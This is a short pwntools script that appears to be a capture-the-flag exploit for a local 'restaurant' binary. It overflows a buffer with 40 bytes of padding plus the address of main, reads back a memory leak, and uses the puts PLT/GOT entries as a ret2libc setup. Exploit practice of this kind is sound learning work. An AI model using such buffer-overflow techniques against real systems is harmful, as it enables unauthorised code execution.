#!/usr/bin/env python
from pwn import *
# context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("./restaurant")
libc=ELF("./libc.so.6")

#libc = ELF("libc-2.29.so")
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('restaurant')

gs = '''
continue
'''

# for key, address in binf.symbols.iteritems():
#     if 'puts' in key:
#         print key, hex(address)
plt_puts=binf.plt['puts']
got_puts=binf.got['puts']
print(hex(plt_puts))
print(hex(got_puts))
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"


p=start()
#pause()

p.sendlineafter(">", "1")
# pause()
sleep(1)
pad=40
pause()
p.sendlineafter(">", b'A'*pad+p64(binf.symbols['main']))
p.recvuntil("A"*pad)
leak1= p.recvuntil('my dish')
# for i in leak1:
#     print(i)
# print("leak",leak1)
p.interactive()
